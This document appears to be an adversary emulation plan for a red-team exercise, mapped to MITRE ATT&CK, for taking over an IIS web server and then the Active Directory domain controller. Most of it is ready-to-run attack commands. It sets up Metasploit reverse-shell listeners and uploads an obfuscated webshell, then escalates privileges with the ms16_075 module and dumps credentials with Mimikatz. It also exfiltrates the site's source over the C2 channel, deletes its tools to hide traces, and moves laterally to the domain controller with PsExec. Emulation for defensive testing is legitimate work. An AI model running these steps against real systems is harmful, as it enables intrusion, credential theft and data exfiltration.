# Scenario 1

## I. Preface
This scenario begins when the attacker successfully exploits a vulnerable upload file on an IIS webserver and executes a malicious payload to gain a foothold on the system. Following initial compromise, the attacker expands access to other hosts through privilege escalation, credential access, and lateral movement with the goal of compromising the Active Directory server, which means the whole domain.

This emulation plan contains several placeholder values that are meant to be replaced with values specific to the target environment against which this plan is to be run.

|||
|-|-|
|`<user_admin>`| Username of local admin account |
|`<pass_admin>`| Username of local admin account |
|`<domain>`| Name of the domain |
|`<ip_attacker>`| IP of attacker's computer |
|`<ip_iis`| IP of IIS Server |
|`<name_ad>`| Name of AD Server |


## II. Contents

* [Step 0 - Setup](#step0)
* [Step 1 - Initial Access](#step1)
* [Step 2 - Privilege Escalation](#step2)
* [Step 3 - Target Assessment](#step3)
* [Step 4 - Collection](#step4)
* [Step 5 - Credentials Dumping](#step5)
* [Step 6 - Domain Discovery](#step6)
* [Step 7 - Lateral Movement](#step7)

---

### Pre-requisites

Prior to beginning the following emulation Scenario, ensure you have the proper infrastructure requirements and configuration in place as stated in the [Scenario 1 Infrastructure](./Infrastructure.md) documentation.

---

### Step 0 - Setup <a name="step0"></a>

#### 0 - Start C2 Server
On the `Attack Platform`:

1. `ctrl - alt - T` to open `Terminal 1`

2. Start listening on port `4444`
```
msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost <ip_attacker>;set lport 4444;run'
```

---

### Step 1 - Initial Access <a name="step1"></a>

The scenario begins when attacker successfully exploit File upload vulnerability ([T1190](https://attack.mitre.org/techniques/T1190/)) and upload a obfucated ([T1027](https://attack.mitre.org/techniques/T1027/)) webshell ([T1505.003](https://attack.mitre.org/techniques/T1505/003/)) `session.aspx` to the target's webserver. <br>
After opening the webshell, `Attack Platform` receives a reverse shell connection from `IIS server` ([T1059.003](https://attack.mitre.org/techniques/T1059/003/))  using Transmission Control Protocol (TCP) ([T1071.001](https://attack.mitre.org/techniques/T1071/001/)) on a random port ([T1571](https://attack.mitre.org/techniques/T1571/))

#### 1.A - Upload reverse shell
On the `Attack Platform`:

1. Open `<ip_iis>` on a web browser

2. Click `Browse...` and select `session.aspx` for uploading

3. Click `Send`

#### 1.B - Execute reverse shell

On the `Attack Platform`:

1. Open `<ip_iis>/session.aspx` on web browser

2. Now on `Terminal 1` there should be a meterpreter session

---

### Step 2  - Privilege Escalation <a name="step2"></a>

The attacker exploit `IIS server` using `Windows Net-NTLMv2 Reflection DCOM/RPC (Juicy)` vunerable to get `System` privilege ([T1068](https://attack.mitre.org/techniques/T1068/))

#### 2 - Obtain System shell
On the `Terminal 1` of `Attack Platform`:

1. Run these command on the meterpreter session obtained from the previous step
```
background
use exploit/windows/local/ms16_075_reflection_juicy
set TARGET 0
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set SESSION 1
exploit

```

---

### Step 3 - Target Assessment <a name="step3"></a>
The attacker executes powershell ([T1059](https://attack.mitre.org/techniques/T1059/001/)) discovery scripts, which gather information such as device hostname, username, domain ([T1033](https://attack.mitre.org/techniques/T1033/)), CPU architecture ([T1082](https://attack.mitre.org/techniques/T1082/)), services ([T1007](https://attack.mitre.org/techniques/T1007/)), and currently running processes ([T1057](https://attack.mitre.org/techniques/T1057/)).  
After that, the attacker deletes the script ([T1070.004](https://attack.mitre.org/techniques/T1070/004/))

#### 3.A - Upload scripts 
On the `Terminal 1` of `Attack Platform`:

1. Send `sysinfo.ps1` to `IIS webserver`
```
upload /tmp/modules/sysinfo.ps1 C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\sysinfo.ps1
```

#### 3.B - Collect host information
On the `Terminal 1` of `Attack Platform`:

1. Load PowerShell into memory
```
load powershell
```

2. Execute `sysinfo.ps1`
```
powershell_execute C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\sysinfo.ps1
```

#### 3.C - File Deletion
On the `Terminal 1` of `Attack Platform`:

1. Delete `sysinfo.ps1`
```
del C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\sysinfo.ps1
```

### Step 4 - Collection <a name="step4"></a>
The attacker search for `IIS server` ([T1005](https://attack.mitre.org/techniques/T1005/)) webroot and exfiltrate all compressed ([T1560](https://attack.mitre.org/techniques/T1560/)) source files of the website through C2 channel ([T1041](https://attack.mitre.org/techniques/T1041/)).
Finally, the attacker removes any leftover files ([T1070.004](https://attack.mitre.org/techniques/T1070/004/)).

#### 4.A - IIS webroot search
On the `Terminal 1` of `Attack Platform`:

1. Switch to cmd shell
```
shell
```

2. Get `<webroot>`
```
C:\\Windows\\System32\\inetsrv\\appcmd.exe list vdir /text:physicalPath
```

The result may in special folder format, attackers must convert into full path.

#### 4.B - Compress source files
On the `Terminal 1` of `Attack Platform`:

1. Switch back to meterpreter session
```
exit
```

2. Upload compress tool
```
upload ~/modules/7z.exe C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\7z.exe
```

3. Switch to cmd shell
```
shell
```

4. Compress into zip file
```
C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\7z.exe a C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\source.zip <webroot>
```

#### 4.C - Exfiltrate through C2 channel
On the `Terminal 1` of `Attack Platform`:

1. Switch back to meterpreter session
```
exit
```

2. Get file
```
download C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\source.zip ~/
```

#### 4.D - Files Removal
On the `Terminal 1` of `Attack Platform`:
```
del C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\source.zip
```

```
del C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\7z.exe
```

### Step 5 - Credentials Dumping <a name="step5"></a>

With a `System` shell in hand, attacker starts to collect credentials cached in memory using `Mimikatz` ([T1003.001](https://attack.mitre.org/techniques/T1003/001/))
After that, they examine local files in `<user_admin>`'s home directory ([T1083](https://attack.mitre.org/techniques/T1083/))

#### 5.A - Load Mimikatz

On the `Terminal 1` of `Attack Platform`:

1.  Load mimikatz to memory
```
load kiwi
```

#### 5.B - Dump credentials

On the `Terminal 1` of `Attack Platform`:

1.  Dump all types of credentials including `msv`, `wdigest`, `kerberos`. Note that in this scenario
we focus on `wdigest` credentials
```
creds_all
```

2.  Collect `<user_admin>`, `<pass_admin>` and `<domain>` 

---

### 5.C - Examine local files
On the `Terminal 1` of `Attack Platform`:

1. Look for files in user home directory
```
meterpreter > ls C:\\Users\\<user_admin>.<domain>\\
```

### Step 6 - Domain Discovery <a name="step6"></a>

The attacker use `nslookup` on `<domain>` to get the domain controller's name `<name_ad>` ([T1018](https://attack.mitre.org/techniques/T1018/))

#### 6 - Find domain controller's name

On the `Terminal 1` of `Attack Platform`:

1.  Switch from meterpreter session to cmd shell
```
shell
```

2.  Run `nslookup` command
```
nslookup <domain>
```

3.  Obtain the server's name on the first line

4.  Return to meterpreter session
```
exit
```

---

### Step 7 - Lateral Movement <a name="step7"></a>

The attacker now has `<name_ad>`, `<user_admin>` and `<pass_admin>`. They now can upload `PsExec` and a malicious module ([T1105](https://attack.mitre.org/techniques/T1105/) , [T1570](https://attack.mitre.org/techniques/T1570/) ) then remote execute to get a reverse shell from `AD server` ([T1569.002](https://attack.mitre.org/techniques/T1569/002/) , [T1021.002](https://attack.mitre.org/techniques/T1021/002/)) using above credentials.

#### 7.A - Tools transfer

On the `Terminal 1` of `Attack Platform`:

1.  Upload `PsExec.exe` to `C:\Users\<user_admin>\AppData\Local\Temp`
```
upload /tmp/modules/PsExec.exe C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\PsExec.exe
```

2.  Upload `session.exe` to `C:\Users\<user_admin>\AppData\Local\Temp`
```
upload /tmp/modules/session.exe C:\\Users\\<user_admin>\\AppData\\Local\\Temp\\session.exe
```

#### 7.B - Listen for another session

On the `Attack Platform`:

1. `ctrl - alt - T` to open `Terminal 2`

2. Start listening on port `4445`
```
msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost <ip_attacker>;set lport 4445;run'
```

#### 7.C - Remote Execute

On the `Terminal 1` of `Attack Platform`:

1.  Move to the tools's location
```
shell
cd C:\Users\<user_admin>\AppData\Local\Temp
```

2.  Run `PsExec.exe` to execute `session.exe` on `AD Server`
```
psexec.exe \\<name_ad> -i -h -u <user_admin> -p <pass_admin> -accepteula -d -c session.exe
```

3.  Now `Terminal 2` should receive a connection back from `AD Server` with local admin privilege

---





